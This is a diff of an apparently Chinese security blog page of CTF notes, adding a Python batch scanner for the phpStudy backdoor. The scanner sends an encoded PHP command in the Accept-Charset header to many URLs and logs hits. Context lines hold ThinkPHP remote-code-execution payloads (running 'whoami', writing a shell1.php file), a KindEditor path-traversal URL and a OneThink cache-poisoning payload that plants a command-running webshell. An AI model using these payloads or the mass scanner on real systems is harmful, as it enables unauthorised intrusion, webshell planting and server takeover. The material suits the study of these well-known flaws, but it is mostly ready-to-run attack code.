@@ -385,14 +385,14 @@ _method=__construct&amp;amp;filter=system&amp;amp;method">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    156
+                    442
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 				
@@ -414,7 +414,60 @@ _method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=
 <pre><code>index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></pre><p>写文件payload(不唯一):</p>
 <pre><code>index.php?s=/index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell1.php&amp;vars[1][]=&lt;?phpinfo();?&gt;i</code></pre><h3 id="kindeditor编辑器的文件目录遍历漏洞"><a href="#kindeditor编辑器的文件目录遍历漏洞" class="headerlink" title="kindeditor编辑器的文件目录遍历漏洞"></a>kindeditor编辑器的文件目录遍历漏洞</h3><pre><code>http://2c0bc5a13a96421a844a8ec8ec3743efc0c7f53181614fcc.changame.ichunqiu.com/kindeditor/php/file_manager_json.php?path=../</code></pre><h3 id="OneThink-CMS的缓存漏洞"><a href="#OneThink-CMS的缓存漏洞" class="headerlink" title="OneThink CMS的缓存漏洞"></a>OneThink CMS的缓存漏洞</h3><pre><code>新建用户
 %0a$a=$_GET[a];#%0asystem($a);#</code></pre><p>记得urldecode<br>然后访问</p>
-<pre><code>http://19640660af614d60879d5f56b41efc7ae9b0ab83ffb74fd0.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=ls</code></pre>
+<pre><code>http://19640660af614d60879d5f56b41efc7ae9b0ab83ffb74fd0.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=ls</code></pre><h3 id="phpstudy后门检测"><a href="#phpstudy后门检测" class="headerlink" title="phpstudy后门检测"></a>phpstudy后门检测</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># !/usr/bin/env python</span>
+<span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>
+
+<span class="token keyword">import</span> gevent
+<span class="token keyword">from</span> gevent <span class="token keyword">import</span> monkey
+
+gevent<span class="token punctuation">.</span>monkey<span class="token punctuation">.</span>patch_all<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">import</span> requests <span class="token keyword">as</span> rq
+
+
+<span class="token keyword">def</span> <span class="token function">file_read</span><span class="token punctuation">(</span>file_name<span class="token operator">=</span><span class="token string">"http-200-list.txt"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">with</span> open<span class="token punctuation">(</span>file_name<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">[</span>i<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+
+
+<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token triple-quoted-string string">'''
+    if "http://" or "https://" not in url:
+        url = "https://" + url
+    '''</span>
+    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27'</span><span class="token punctuation">,</span>
+        <span class="token string">'Sec-Fetch-Mode'</span><span class="token punctuation">:</span> <span class="token string">'navigate'</span><span class="token punctuation">,</span>
+        <span class="token string">'Sec-Fetch-User'</span><span class="token punctuation">:</span> <span class="token string">'?1'</span><span class="token punctuation">,</span>
+        <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span><span class="token punctuation">,</span>
+        <span class="token string">'Sec-Fetch-Site'</span><span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>
+        <span class="token string">'Accept-Charset'</span><span class="token punctuation">:</span> <span class="token string">'ZWNobyBlZVN6eHU5Mm5JREFiOw=='</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true"># 输出 eeSzxu92nIDAb</span>
+        <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip,deflate'</span><span class="token punctuation">,</span>
+        <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.9'</span><span class="token punctuation">,</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        res <span class="token operator">=</span> rq<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'eeSzxu92nIDAb'</span><span class="token punctuation">)</span>
+            <span class="token comment" spellcheck="true">#print(res.text.find('eeSzxu92nIDAb'))</span>
+            <span class="token keyword">if</span> res<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'eeSzxu92nIDAb'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[存在漏洞] "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>
+                f<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">"ok.txt"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>
+                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"[存在漏洞] "</span> <span class="token operator">+</span> url<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
+                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[不存在漏洞] "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token comment" spellcheck="true">#raise e</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[超时] "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"phpStudy 批量检测 (需要 gevent,requests 库)"</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"使用之前，请将URL保存为 url.txt 放置此程序同目录下"</span><span class="token punctuation">)</span>
+    input<span class="token punctuation">(</span><span class="token string">"任意按键开始执行.."</span><span class="token punctuation">)</span>
+    tasks <span class="token operator">=</span> <span class="token punctuation">[</span>gevent<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span>check<span class="token punctuation">,</span> url<span class="token punctuation">)</span> <span class="token keyword">for</span> url <span class="token keyword">in</span> file_read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在执行...请等候"</span><span class="token punctuation">)</span>
+    gevent<span class="token punctuation">.</span>joinall<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span>
+    wait <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"执行完毕 任意键退出..."</span><span class="token punctuation">)</span></code></pre>
+
             </div>
             <hr/>
 
@@ -758,7 +811,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">150.3k</span>&nbsp;字
+                class="white-color">150.6k</span>&nbsp;字
             
             
             
